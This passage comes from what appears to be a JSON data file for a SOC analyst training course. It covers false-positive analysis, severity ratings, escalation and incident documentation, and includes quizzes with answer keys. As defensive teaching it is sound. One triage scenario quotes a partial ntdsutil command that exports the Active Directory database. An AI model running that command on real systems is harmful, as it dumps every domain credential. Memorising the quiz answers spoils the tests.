            "scenarioText": "SIEM detected 5,000 port connections from 10.0.99.10 across internal subnets. The asset database confirms 10.0.99.10 is the enterprise Tenable Nessus scanner running its scheduled Thursday audit.",
            "evidenceItems": [
              {
                "label": "Source Host",
                "value": "10.0.99.10 (Nessus Scanner)",
                "insight": "Authorized vulnerability scanner"
              },
              {
                "label": "Destination",
                "value": "10.0.4.0/24 (Internal LAN)",
                "insight": "Scheduled weekly audit"
              },
              {
                "label": "Change Ticket",
                "value": "CHG-9901 (Approved)",
                "insight": "Authorized maintenance window"
              }
            ],
            "correctVerdict": "FALSE_POSITIVE",
            "rationale": "The scan activity originates from an authorized vulnerability scanner during an approved maintenance window, constituting expected administrative activity.",
            "analystAction": "Document change ticket CHG-9901 in the ticket, close alert as False Positive (Expected Activity), and verify exclusion tuning."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-4-assessment",
      "title": "Topic 4 Assessment: False Positive Analysis",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u4-q1",
          "question": "What defines a security False Positive in a SOC environment?",
          "options": [
            "An alert that accurately detected a real hacker",
            "An alert triggered on activity that is legitimate, authorized, or benign",
            "A malware attack that succeeded without detection",
            "An alert that was sent to the wrong analyst"
          ],
          "correctAnswer": 1,
          "explanation": "A false positive is an alert that fired on normal, approved, or non-malicious activity."
        },
        {
          "id": "u4-q2",
          "question": "Which of the following is the most reliable method to verify if suspicious admin activity is authorized Expected Activity?",
          "options": [
            "Asking the employee on Slack if they did it",
            "Checking the enterprise Change Management system (e.g. ServiceNow CHG tickets) for an approved maintenance window",
            "Assuming anything done by an IT admin is always safe",
            "Waiting 24 hours to see if anything breaks"
          ],
          "correctAnswer": 1,
          "explanation": "Authorized IT maintenance and deployments are documented in approved Change Management tickets."
        },
        {
          "id": "u4-q3",
          "question": "What is the primary operational danger of having an excessively high False Positive Rate in the SOC?",
          "options": [
            "The SIEM database runs out of disk space",
            "Analyst alert fatigue leads to genuine attacks being overlooked or hastily closed",
            "Antivirus licenses expire faster",
            "Network bandwidth slows down by 50%"
          ],
          "correctAnswer": 1,
          "explanation": "Alert fatigue causes exhausted analysts to overlook subtle indicators of genuine compromise."
        },
        {
          "id": "u4-q4",
          "question": "When submitting a tuning request to Detection Engineering for a noisy rule, what information must the Tier 1 analyst provide?",
          "options": [
            "Just say \"the rule is bad\"",
            "The Alert ID, raw log payload, why it is benign, and specific narrow exclusion criteria (e.g. parent process, path, hash)",
            "A request to delete the entire SIEM rule completely",
            "The user password"
          ],
          "correctAnswer": 1,
          "explanation": "Specific evidence and narrow exclusion recommendations allow engineers to tune out noise without creating blind spots."
        }
      ]
    }
  },
  {
    "id": "unit-5",
    "unitNumber": 5,
    "title": "Unit 5: Severity",
    "description": "Master incident severity classification (Low, Medium, High, Critical) using asset impact, attacker progress, evidence confidence, and SLA timers.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-5-1",
        "unitId": "unit-5",
        "title": "Topic 1: Severity Scale: Low, Medium, High & Critical",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "Severity ratings dictate the urgency, response speed, resource allocation, and escalation thresholds for an alert.",
            "Critical (P1): Active widespread ransomware, domain controller compromise, or data exfiltration. SLA: 15-minute response, 24/7 immediate callout.",
            "High (P2): Single-host malware execution, compromised privileged account, or active C2 beaconing. SLA: 1-hour response.",
            "Medium (P3): Isolated suspicious activity, unauthorized software installation, or multiple failed logins on non-critical assets. SLA: 4-hour response.",
            "Low (P4): Minor policy violations, single port scans, adware detections, or low-probability anomalies. SLA: 24-hour response.",
            "Service Level Agreements (SLAs) measure Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)."
          ],
          "knowMore": {
            "title": "FIRST Common Vulnerability Scoring System (CVSS) and Severity Metrics",
            "description": "Learn the international industry standard for assessing vulnerability severity and translating impact into operational SOC priority.",
            "externalUrl": "https://www.first.org/cvss/",
            "externalLabel": "FIRST CVSS Standards"
          }
        },
        "demo": {
          "title": "[Demo] Evaluating Incident Severity in Action",
          "subtitle": "Observe how the same malware type receives different severities depending on target asset context",
          "steps": [
            {
              "id": 1,
              "stage": "Scenario A: Test Lab",
              "iconName": "endpoint",
              "title": "Malware Detected on Isolated Test VM",
              "description": "Commodity Trojan detected on non-domain joined developer sandbox with no internet access.",
              "telemetrySnippet": "ASSET: Sandbox-VM-04 | Network: Isolated VLAN 999 | Impact: Negligible",
              "highlightText": "Severity: LOW. Blast radius is contained to an isolated test environment."
            },
            {
              "id": 2,
              "stage": "Scenario B: Workstation",
              "iconName": "endpoint",
              "title": "Malware Detected on Accounting Laptop",
              "description": "Same Trojan detected on domain-joined workstation FIN-WS-09 with active C2 connection.",
              "telemetrySnippet": "ASSET: FIN-WS-09 | Network: Corporate LAN | C2: Active External Sockets",
              "highlightText": "Severity: HIGH. Single host compromised on internal corporate production network."
            },
            {
              "id": 3,
              "stage": "Scenario C: Domain Controller",
              "iconName": "server",
              "title": "Malware Detected on Primary Domain Controller",
              "description": "Same Trojan detected executing under SYSTEM context on DC-01; Kerberos tickets being forged.",
              "telemetrySnippet": "ASSET: DC-01 (Crown Jewel) | Identity: Full Domain Admin Compromise | Scope: Enterprise",
              "highlightText": "Severity: CRITICAL. Compromise of the primary identity root affects every enterprise system."
            }
          ]
        },
        "interactive": {
          "title": "Severity Level Matrix Alignment",
          "scenario": "Review the four incidents below and assign the appropriate severity rating based on SLA requirements.",
          "cards": [
            {
              "id": "ev-sev-crit",
              "category": "User",
              "label": "Active Ransomware on Core File Server",
              "summary": "Files actively encrypting on SAN storage cluster.",
              "detailedFindings": "Affects 2,000 users. Business operations halted. Immediate executive notification required.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-sev-high",
              "category": "Event ID",
              "label": "Mimikatz Execution on Executive Laptop",
              "summary": "Credential dumping detected on CFO laptop.",
              "detailedFindings": "Potential theft of executive credentials. Single host isolated; lateral movement not yet observed.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-sev-med",
              "category": "Source IP",
              "label": "Unusual External Login on Standard User",
              "summary": "Login from new country without MFA bypass.",
              "detailedFindings": "Non-privileged marketing user. Suspicious location flagged for identity verification.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-sev-low",
              "category": "Timeline",
              "label": "Adware Tool Installed on Guest Wi-Fi",
              "summary": "Browser toolbar extension detected on BYOD laptop.",
              "detailedFindings": "No access to corporate domain. Standard adware behavior with no network propagation.",
              "severityIndicator": "Normal"
            }
          ]
        },
        "socContext": {
          "title": "Managing SLA Breach Risks",
          "scenario": "A Critical alert fires at 02:00 AM. The on-duty Tier 1 analyst leaves it in queue because their shift ends in 30 minutes.",
          "analystMindset": "A Critical SLA timer never stops. A P1 breach must be acknowledged and contained immediately, regardless of shift changes.",
          "bestPractices": [
            "Acknowledge P1/Critical alerts within 5 minutes to stop the SLA clock.",
            "Never downgrade an alert severity simply to avoid an SLA breach penalty.",
            "Conduct a formal handoff meeting for any open High or Critical alerts at shift handover."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Severity Levels to Target Response SLAs",
            "instructions": "Match each severity level with its typical enterprise SOC response timeframe.",
            "pairs": [
              {
                "id": "sv1",
                "left": "Critical (P1)",
                "right": "15 Minutes (Immediate 24/7 callout & containment)"
              },
              {
                "id": "sv2",
                "left": "High (P2)",
                "right": "1 Hour (Active single-system compromise response)"
              },
              {
                "id": "sv3",
                "left": "Medium (P3)",
                "right": "4 Hours (Isolated suspicious activity investigation)"
              },
              {
                "id": "sv4",
                "left": "Low (P4)",
                "right": "24 Hours (Low risk policy violations and hygiene)"
              }
            ],
            "explanation": "Critical alerts require immediate 15-minute response; Low alerts allow 24-hour business day triage."
          }
        }
      },
      {
        "id": "topic-5-2",
        "unitId": "unit-5",
        "title": "Topic 2: Impact, Confidence & [Lab] 🔵 Severity Classification",
        "order": 2,
        "estimatedMinutes": 25,
        "xpReward": 75,
        "theory": {
          "summaryLines": [
            "Severity is not arbitrary; it is calculated using the formula: Severity = Impact × Confidence.",
            "Impact measures the potential harm to the business: Asset Criticality (Crown Jewels vs guest VM) + Attacker Objective (Reconnaissance vs Destruction).",
            "Confidence measures the fidelity of the telemetry: Single heuristic anomaly (Low Confidence) vs Multiple corroborating EDR + Firewall IOCs (High Confidence).",
            "A High Impact alert with Low Confidence requires urgent verification before shutting down production systems.",
            "A High Impact alert with High Confidence requires immediate emergency containment."
          ],
          "knowMore": {
            "title": "MITRE ATT&CK: Assessing Adversary Objectives and Impact",
            "description": "Learn how to map threat actor tactics (Impact TA0040) to enterprise risk calculations.",
            "externalUrl": "https://attack.mitre.org/tactics/TA0040/",
            "externalLabel": "MITRE ATT&CK Impact"
          }
        },
        "demo": {
          "title": "[Demo] The Impact vs. Confidence Matrix",
          "subtitle": "Step through calculating operational severity using asset value and evidence fidelity",
          "steps": [
            {
              "id": 1,
              "stage": "Asset Criticality",
              "iconName": "server",
              "title": "Determine Crown Jewel Tier",
              "description": "Target asset is SWIFT Banking Gateway (Tier 0 Crown Jewel). Impact Potential: Maximum.",
              "telemetrySnippet": "ASSET CMDB: Host=SWIFT-GW-01 | Tier=0 (Financial Gateway) | ImpactWeight=5/5",
              "highlightText": "Crown Jewel systems carry the highest intrinsic impact in the enterprise."
            },
            {
              "id": 2,
              "stage": "Evidence Fidelity",
              "iconName": "siem",
              "title": "Evaluate Telemetry Confidence",
              "description": "Single port scan from external IP: Low Confidence. EDR process injection + C2 beaconing: High Confidence.",
              "telemetrySnippet": "CONFIDENCE: 3 independent sensors match known Lazarus APT signatures (Score: 98%)",
              "highlightText": "Corroborating indicators push confidence to the maximum level."
            },
            {
              "id": 3,
              "stage": "Final Calculation",
              "iconName": "analyst",
              "title": "Final Severity: CRITICAL (P1)",
              "description": "Maximum Impact (Tier 0 Gateway) × Maximum Confidence (Confirmed APT C2) = Severity 1 Critical.",
              "telemetrySnippet": "SEVERITY RATING: CRITICAL | SLA: 15m | Escalation: IR Team & CISO Engaged",
              "highlightText": "Objective formulas eliminate subjective guessing in incident severity rating."
            }
          ]
        },
        "interactive": {
          "title": "[Lab] 🔵 Severity Classification: Classify 4 Live Incidents",
          "scenario": "Review each scenario and classify its severity based on asset impact and evidence confidence.",
          "cards": [
            {
              "id": "ev-cls-1",
              "category": "User",
              "label": "Scenario 1: Active Directory Database Dump",
              "summary": "ntdsutil.exe created copy of ntds.dit on DC-01.",
              "detailedFindings": "Domain Controller compromise. All corporate password hashes stolen. Impact: Catastrophic. Confidence: High.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-cls-2",
              "category": "Event ID",
              "label": "Scenario 2: Single Phishing Email Clicked",
              "summary": "User clicked link; entered credentials on fake login.",
              "detailedFindings": "Standard user workstation. Password reset within 10 minutes. No malware downloaded. Impact: Medium.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-cls-3",
              "category": "Source IP",
              "label": "Scenario 3: External Reconnaissance Probe",
              "summary": "Shodan IP scanned corporate web server port 80.",
              "detailedFindings": "Public web server. Traffic dropped by perimeter Web Application Firewall. Impact: Low.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-cls-4",
              "category": "Timeline",
              "label": "Scenario 4: EDR Isolation of Trojan on HR Laptop",
              "summary": "Banking Trojan blocked and isolated on workstation.",
              "detailedFindings": "Single workstation. Host isolated automatically by CrowdStrike. No lateral spread. Impact: High (contained).",
              "severityIndicator": "Suspicious"
            }
          ]
        },
        "socContext": {
          "title": "Avoiding Under-Categorization of Low-Noise Threats",
          "scenario": "An attacker executes slow, stealthy reconnaissance (1 command every 6 hours) on a database server. Analyst flags it as Low because volume is small.",
          "analystMindset": "Volume does not equal severity. Sophisticated nation-state actors generate very few alerts. Evaluate the asset value and actor intent.",
          "bestPractices": [
            "Classify any confirmed hands-on-keyboard activity on a server as High or Critical.",
            "Factor in regulatory impact (GDPR, HIPAA, PCI-DSS) when assessing data breach severity.",
            "Document the rationale behind severity upgrades or downgrades in the ticket log."
          ]
        },
        "knowledgeCheck": {
          "triageScenario": {
            "id": "ts-sev-lab",
            "alertName": "Alert ALT-501: Active Directory NTDS.dit Export",
            "severity": "CRITICAL",
            "scenarioText": "An attacker on Primary Domain Controller DC-01 executed ntdsutil to export the Active Directory database containing all enterprise hashes.",
            "evidenceItems": [
              {
                "label": "Target Asset",
                "value": "DC-01 (Domain Controller)",
                "insight": "Tier 0 Crown Jewel"
              },
              {
                "label": "Command Executed",
                "value": "ntdsutil.exe \"ac i ntds\" \"ifm\" ...",
                "insight": "Dumping all domain credentials"
              },
              {
                "label": "User Context",
                "value": "NT AUTHORITY\\SYSTEM",
                "insight": "Maximum administrative privilege"
              }
            ],
            "correctVerdict": "TRUE_POSITIVE",
            "rationale": "Unauthorized theft of the Active Directory database compromises the identity root of the entire enterprise, requiring immediate Critical P1 response.",
            "analystAction": "Activate 24/7 Incident Response war room, notify CISO, initiate Tier 0 containment, and prepare emergency krbtgt rotation."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-5-assessment",
      "title": "Topic 5 Assessment: Severity Classification",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u5-q1",
          "question": "What are the two primary factors used to objectively determine incident severity?",
          "options": [
            "Day of the week and analyst mood",
            "Asset Impact (Business Criticality) and Evidence Confidence (Fidelity)",
            "Length of the alert name and number of characters",
            "Operating system brand and CPU speed"
          ],
          "correctAnswer": 1,
          "explanation": "Severity is calculated by multiplying the potential Business Impact of the asset by the Confidence level of the telemetry."
        },
        {
          "id": "u5-q2",
          "question": "Which of the following incidents qualifies as a Critical (P1) severity rating?",
          "options": [
            "A single failed password attempt on a guest Wi-Fi portal",
            "Active ransomware spreading across enterprise servers and domain controllers",
            "An employee visiting a sports news website during lunch",
            "A printer running low on toner"
          ],
          "correctAnswer": 1,
          "explanation": "Ransomware impacting multiple servers or core domain controllers threatens business survival and is a Critical (P1) emergency."
        },
        {
          "id": "u5-q3",
          "question": "In standard SOC operational metrics, what does \"MTTR\" stand for?",
          "options": [
            "Maximum Telemetry Tracking Record",
            "Mean Time to Respond (or Remediate)",
            "Main Threat Triage Routine",
            "Multi-Tier Threat Recovery"
          ],
          "correctAnswer": 1,
          "explanation": "MTTR stands for Mean Time to Respond (or Remediate), measuring how quickly the team neutralizes confirmed threats."
        },
        {
          "id": "u5-q4",
          "question": "If an alert fires on a Tier 0 Crown Jewel server, but the telemetry is heuristic with low confidence, what should the analyst do?",
          "options": [
            "Immediately wipe the server without checking",
            "Ignore it because confidence is low",
            "Triage with urgency: quickly verify corroborating telemetry before executing disruptive containment",
            "Wait 48 hours for more alerts to accumulate"
          ],
          "correctAnswer": 2,
          "explanation": "High impact demands urgent attention, but low confidence requires fast verification before taking disruptive actions on production systems."
        }
      ]
    }
  },
  {
    "id": "unit-6",
    "unitNumber": 6,
    "title": "Unit 6: Escalation",
    "description": "Execute seamless incident escalation: tier-to-tier handoffs (L1 → L2, L2 → L3), specialist team engagement, executive crisis communications, and warm transfers.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-6-1",
        "unitId": "unit-6",
        "title": "Topic 1: Tiered Escalation: L1 → L2 and L2 → L3",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "Escalation is the formal transfer of an investigation from an analyst to higher-tier specialists when the scope exceeds playbook procedures.",
            "L1 → L2 Escalation: Tier 1 escalates when an alert is verified as a True Positive, requires host memory forensics, or needs complex lateral movement tracking.",
            "L2 → L3 Escalation: Tier 2 escalates to Tier 3 when custom malware reverse-engineering, kernel-level rootkit analysis, or threat hunting across enterprise logs is required.",
            "A cold handoff (simply reassigning the ticket without notes) creates confusion and delays response.",
            "A warm handoff requires direct communication: concise summary of findings, verified IOCs, actions taken, and recommended next steps."
          ],
          "knowMore": {
            "title": "CREST: Incident Response Maturity and Handover Procedures",
            "description": "Learn industry best practices for escalation workflows, analyst briefing protocols, and multi-tier incident handling.",
            "externalUrl": "https://www.crest-approved.org/",
            "externalLabel": "CREST IR Standards"
          }
        },
        "demo": {
          "title": "[Demo] The Incident Escalation Packaging Protocol",
          "subtitle": "Watch a Tier 1 analyst assemble a comprehensive escalation package for Tier 2 handoff",
          "steps": [
            {
              "id": 1,
              "stage": "Triage Threshold",
              "iconName": "analyst",
              "title": "Tier 1 Reaches Playbook Boundary",
              "description": "Analyst confirms True Positive malware infection on FIN-WS-09. Attacker established persistence via scheduled task.",
              "telemetrySnippet": "FINDING: Scheduled task \"WinUpdate\" runs encoded script every 15 minutes. Host isolated.",
              "highlightText": "Once basic containment is applied, in-depth root cause analysis requires Tier 2 expertise."
            },
            {
              "id": 2,
              "stage": "Package Assembly",
              "iconName": "analyst",
              "title": "Drafting the Escalation Briefing",
              "description": "Tier 1 packages: 1. Executive Summary, 2. Affected Entities (User, Host, IP), 3. Extracted IOCs (Hashes, C2 IP), 4. Timeline.",
              "telemetrySnippet": "BRIEFING: Host: FIN-WS-09 | User: jdoe | C2: 198.51.100.42 | Hash: 4a2b91... | Action: Network Isolated",
              "highlightText": "A structured package allows Tier 2 to jump immediately into advanced forensics without repeating basic triage."
            },
            {
              "id": 3,
              "stage": "Warm Handoff",
              "iconName": "server",
              "title": "Ticket Reassignment & Direct Notification",
              "description": "Ticket reassigned to Tier 2 queue; Tier 1 pings on-call responder in the SOC war room channel.",
              "telemetrySnippet": "WAR ROOM: \"@Tier2-OnCall: Handing over INC-402 (True Positive Trojan on FIN-WS-09). Host isolated, IOCs attached.\"",
              "highlightText": "Real-time notification ensures zero delay during critical incident transitions."
            }
          ]
        },
        "interactive": {
          "title": "Escalation Tier Determination Drill",
          "scenario": "Review the four investigation milestones and determine which escalation tier is responsible for handling each.",
          "cards": [
            {
              "id": "ev-esc-l1",
              "category": "User",
              "label": "Alert Queue Verification",
              "summary": "Initial review of inbound SIEM queue.",
              "detailedFindings": "Check alert trigger, extract User, Host, IP entities, and determine whether alert is FP or candidate TP. Tier 1 responsibility.",
              "severityIndicator": "Normal"
            },
            {
              "id": "ev-esc-l2",
              "category": "Event ID",
              "label": "Deep Host Memory Forensics",
              "summary": "Volatilty analysis of RAM dump from isolated host.",
              "detailedFindings": "Extract injected DLLs, unhooked API calls, and determine initial access vector. Tier 2 Incident Responder responsibility.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-esc-l3",
              "category": "Source IP",
              "label": "Malware Disassembly & Reverse Engineering",
              "summary": "Ghidra / IDA Pro analysis of compiled binary.",
              "detailedFindings": "Bypass anti-analysis routines, extract hardcoded C2 backup domains, and build YARA rules. Tier 3 responsibility.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-esc-hunt",
              "category": "Timeline",
              "label": "Enterprise-Wide Threat Hunt",
              "summary": "Proactive sweeping across 10,000 endpoints.",
              "detailedFindings": "Querying historical logs for novel TTPs across the fleet to uncover undetected dwell time. Tier 3 responsibility.",
              "severityIndicator": "Suspicious"
            }
          ]
        },
        "socContext": {
          "title": "Avoiding the \"Dump and Run\" Antipattern",
          "scenario": "An L1 analyst receives a confusing alert, writes \"looks weird please check\", and reassigns it to L2 without isolating the host or listing IOCs.",
          "analystMindset": "Your name is on the ticket. Escalating without clear findings forces Tier 2 to start from scratch and wastes critical golden-hour response time.",
          "bestPractices": [
            "Always execute immediate containment (e.g. host isolation) before handing off if active malware is confirmed.",
            "Include exact timestamps, process IDs, and hashes in the handover notes.",
            "Remain available for 10 minutes after escalation in case Tier 2 has clarifying questions."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Incident Tasks to Correct SOC Tier",
            "instructions": "Match each security operations task with the appropriate tier responsible.",
            "pairs": [
              {
                "id": "et1",
                "left": "Initial alert triage, entity extraction, and host isolation",
                "right": "Tier 1 (Triage Analyst)"
              },
              {
                "id": "et2",
                "left": "Deep forensic analysis, lateral movement tracking, and eradication",
                "right": "Tier 2 (Incident Responder)"
              },
              {
                "id": "et3",
                "left": "Advanced malware reverse-engineering and threat hunting",
                "right": "Tier 3 (Threat Hunter / Specialist)"
              },
              {
                "id": "et4",
                "left": "External crisis communication, regulatory notice, and board briefing",
                "right": "SOC Manager / CISO"
              }
            ],
            "explanation": "Tier 1 triages and contains; Tier 2 investigates and eradicates; Tier 3 reverses malware and hunts; Leadership manages external crisis communications."
          }
        }
      },
      {
        "id": "topic-6-2",
        "unitId": "unit-6",
        "title": "Topic 2: Specialist & Management Escalation",
        "order": 2,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "Security incidents frequently cross technical boundaries requiring Specialist Escalation to external technical teams.",
            "Network Engineering: Engaged to apply emergency perimeter firewall blocks, capture packet PCAPs, or reroute BGP traffic.",
            "IAM / Active Directory Admins: Engaged to revoke Kerberos Golden Tickets (krbtgt reset), reset compromised credentials, or disable federated SSO.",
            "Management Escalation is mandatory when an incident involves severe financial loss, regulatory reporting deadlines (e.g. GDPR 72-hour notification), or executive data.",
            "The SOC Lead briefs the CISO and Incident Commander; the CISO handles corporate communications, legal counsel, and law enforcement."
          ],
          "knowMore": {
            "title": "ENISA: Good Practice Guide for Incident Management Communications",
            "description": "Learn European guidelines on crisis communications, cross-functional escalation, and regulatory breach notification procedures.",
            "externalUrl": "https://www.enisa.europa.eu/",
            "externalLabel": "ENISA Crisis Communications"
          }
        },
        "demo": {
          "title": "[Demo] Cross-Functional Crisis Escalation",
          "subtitle": "Observe how a confirmed domain compromise triggers technical and executive escalation workflows",
          "steps": [
            {
              "id": 1,
              "stage": "Scope Expansion",
              "iconName": "analyst",
              "title": "Threat Exceeds SOC Authority",
              "description": "IR Lead discovers attacker compromised the enterprise Kerberos ticket granting service (Golden Ticket attack).",
              "telemetrySnippet": "CRITICAL EVENT: Event 4769 | Ticket Encryption: RC4 | User: Administrator | Scope: Entire Domain",
              "highlightText": "Eradicating a Golden Ticket requires resetting the krbtgt account twice, impacting every service in the company."
            },
            {
              "id": 2,
              "stage": "Specialist Engagement",
              "iconName": "server",
              "title": "Active Directory Infrastructure Team Summoned",
              "description": "AD engineering leads join emergency incident response bridge to plan synchronized krbtgt password rotations.",
              "telemetrySnippet": "ACTION: AD Lead coordinates 4-hour staggered rotation to prevent enterprise authentication outage.",
              "highlightText": "Specialists provide the domain-specific expertise needed to safely execute deep remediation."
            },
            {
              "id": 3,
              "stage": "Executive Briefing",
              "iconName": "analyst",
              "title": "CISO & Legal Counsel Activated",
              "description": "SOC Manager delivers 3-bullet executive briefing: 1. Threat summary, 2. Current impact, 3. Proposed containment and risks.",
              "telemetrySnippet": "CISO BRIEFING: \"Active containment planned for 04:00 UTC. Legal counsel preparing 72h regulatory disclosure notices.\"",
              "highlightText": "Clear, jargon-free executive communication enables swift business leadership decisions."
            }
          ]
        },
        "interactive": {
          "title": "Specialist Escalation Routing Drill",
          "scenario": "Review the four emergency operational needs and route each to the correct specialist team.",
          "cards": [
            {
              "id": "ev-sp-net",
              "category": "Source IP",
              "label": "Block Malicious C2 Subnet",
              "summary": "Need immediate null-route on core border routers.",
              "detailedFindings": "Attacker beaconing to 203.0.113.0/24. Requires Network Engineering team to update BGP routing and border firewalls.",
              "severityIndicator": "Suspicious"
            },
            {
              "id": "ev-sp-iam",
              "category": "User",
              "label": "Emergency Domain Admin Revocation",
              "summary": "Disable 15 compromised administrative accounts.",
              "detailedFindings": "Attacker holds active sessions. Requires Active Directory Identity Administration team to terminate active Kerberos tickets.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-sp-legal",
              "category": "Timeline",
              "label": "GDPR Customer Data Exposure",
              "summary": "SQL database containing 500,000 EU records breached.",
              "detailedFindings": "Mandatory 72-hour regulatory notification clock ticking. Requires Corporate Legal & Compliance team activation.",
              "severityIndicator": "Malicious"
            },
            {
              "id": "ev-sp-pr",
              "category": "Event ID",
              "label": "Public Threat Actor Ransom Note",
              "summary": "Attacker published breach claim on Twitter/X.",
              "detailedFindings": "Journalists calling corporate switchboard. Requires Corporate Communications / PR team for unified messaging.",
              "severityIndicator": "Suspicious"
            }
          ]
        },
        "socContext": {
          "title": "Never Speculate During Executive Escalation",
          "scenario": "During an executive call, an analyst tells the CEO \"I think the Chinese government stole all our trade secrets,\" without forensic proof.",
          "analystMindset": "Speak only to confirmed facts. Distinguish clearly between \"What we know\", \"What we suspect\", and \"What we are currently investigating\".",
          "bestPractices": [
            "Use standard incident status terminology (Contained, Eradicated, Investigating).",
            "Avoid technical acronyms when briefing non-technical executive leadership.",
            "Maintain strict confidentiality—never discuss active breaches on unencrypted personal channels."
          ]
        },
        "knowledgeCheck": {
          "matching": {
            "title": "Match Escalation Needs to External Departments",
            "instructions": "Match the incident situation on the left with the correct department on the right.",
            "pairs": [
              {
                "id": "me1",
                "left": "Attacker exfiltrated unencrypted EU customer database",
                "right": "Legal & Privacy Counsel"
              },
              {
                "id": "me2",
                "left": "Need emergency BGP null route for C2 IP range on edge routers",
                "right": "Network Infrastructure Engineering"
              },
              {
                "id": "me3",
                "left": "Journalists requesting comment on ransomware leak site post",
                "right": "Public Relations / Media Relations"
              },
              {
                "id": "me4",
                "left": "Compromised employee suspected of insider sabotage",
                "right": "Human Resources & Corporate Security"
              }
            ],
            "explanation": "Cross-functional escalation engages specialists according to legal, infrastructure, public, and personnel requirements."
          }
        }
      }
    ],
    "assessment": {
      "id": "unit-6-assessment",
      "title": "Topic 6 Assessment: Escalation Procedures",
      "passingScore": 75,
      "xpReward": 100,
      "questions": [
        {
          "id": "u6-q1",
          "question": "What is the primary difference between a \"warm handoff\" and a \"cold handoff\" during incident escalation?",
          "options": [
            "A warm handoff occurs during summer months only",
            "A warm handoff involves direct communication with the incoming team, including a summary of findings, verified IOCs, and actions taken",
            "A cold handoff requires calling the police",
            "A warm handoff requires shutting down the server"
          ],
          "correctAnswer": 1,
          "explanation": "A warm handoff ensures all investigative context, containment actions, and verified IOCs are directly transferred to the receiving responder."
        },
        {
          "id": "u6-q2",
          "question": "When should a Tier 1 analyst escalate an investigation to Tier 2?",
          "options": [
            "Whenever an alert has more than 5 lines of text",
            "When initial triage confirms a True Positive intrusion requiring deep forensics, host memory analysis, or complex containment outside standard playbooks",
            "Only when the analyst wants to go on lunch",
            "Never; Tier 1 must solve all incidents alone"
          ],
          "correctAnswer": 1,
          "explanation": "Tier 1 escalates to Tier 2 when an attack is verified and requires advanced investigation beyond the scope of initial triage playbooks."
        },
        {
          "id": "u6-q3",
          "question": "If an ongoing breach compromises personal customer records subject to GDPR, what is the mandatory external regulatory reporting deadline?",
          "options": [
            "30 days",
            "72 hours",
            "6 months",
            "1 year"
          ],
          "correctAnswer": 1,
          "explanation": "Under GDPR Article 33, organizations must notify supervisory authorities within 72 hours of becoming aware of a personal data breach."
        },
        {
          "id": "u6-q4",
          "question": "Why must technical analysts avoid speculative statements (e.g. \"We think Russian state actors hacked us\") when briefing executive leadership?",
          "options": [
            "It causes technical jargon confusion",
            "Premature speculation can trigger inappropriate legal disclosures, public panic, or incorrect regulatory filings before forensic evidence confirms attribution",
            "Executive leaders do not understand politics",
            "It makes the SIEM slower"
          ],
          "correctAnswer": 1,
          "explanation": "Executive and legal decisions must be grounded in verified forensic evidence, not unconfirmed speculation."
        }
      ]
    }
  },
  {
    "id": "unit-7",
    "unitNumber": 7,
    "title": "Unit 7: SOC Documentation",
    "description": "Master professional incident documentation: the 5 core pillars (Findings, Evidence, Timeline, Actions, Recommendations), ticketing excellence, and audit readiness.",
    "estimatedHours": 2,
    "topics": [
      {
        "id": "topic-7-1",
        "unitId": "unit-7",
        "title": "Topic 1: The 5 Pillars of Documentation & [Demo] SOC Ticket",
        "order": 1,
        "estimatedMinutes": 20,
        "xpReward": 50,
        "theory": {
          "summaryLines": [
            "In security operations, if an action was not documented, it legally and operationally never happened.",
            "Pillar 1: Findings. Concise executive summary detailing what occurred, affected assets, and the root cause.",
            "Pillar 2: Evidence. Technical artifacts including process command lines, SHA-256 hashes, IP addresses, domains, and log excerpts.",
            "Pillar 3: Timeline. Chronological sequence of events in UTC from initial access to detection, containment, and recovery.",
            "Pillar 4: Actions. Exact steps executed by analysts (e.g. host isolated at 03:18 UTC, password reset at 03:22 UTC, firewall block applied at 03:25 UTC).",
            "Pillar 5: Recommendation. Strategic mitigations to prevent recurrence (e.g. disable Office macros, implement MFA on VPN, tune SIEM rule)."
          ],
          "knowMore": {
            "title": "SANS Institute: Writing Effective Incident Reports for Management and Technical Teams",
            "description": "Learn the industry benchmark for structuring incident documentation that withstands regulatory and judicial scrutiny.",
            "externalUrl": "https://www.sans.org/white-papers/33349/",
            "externalLabel": "SANS Incident Documentation"
          }
        },
        "demo": {
          "title": "[Demo] Anatomy of an Audit-Proof SOC Ticket",
          "subtitle": "Compare a poorly documented analyst ticket against a professional gold-standard ticket",
          "steps": [
            {
              "id": 1,
              "stage": "Poor Ticket Example",
              "iconName": "analyst",
              "title": "Deficient Ticket: \"User had a virus. Fixed.\"",
              "description": "No timestamps, no hash, no explanation of how malware arrived, no documentation of containment steps.",
              "telemetrySnippet": "TICKET NOTES: \"Cleaned virus with antivirus. Closing ticket.\" -> REJECTED BY AUDIT",
              "highlightText": "Vague documentation leaves the organization vulnerable to reinfection and audit failure."
            },
            {
              "id": 2,
              "stage": "Gold Standard Findings",
              "iconName": "analyst",
              "title": "Pillar 1: Clear Executive Findings",
              "description": "Executive summary states: Trojan dropper executed via phishing attachment on FIN-WS-09. C2 beaconing prevented by EDR isolation.",
              "telemetrySnippet": "FINDINGS: Host FIN-WS-09 infected with Emotet variant via invoice.docm. Initial access confirmed at 03:14 UTC.",
              "highlightText": "Any manager or auditor reading the findings understands the incident within 30 seconds."
            },
            {
              "id": 3,
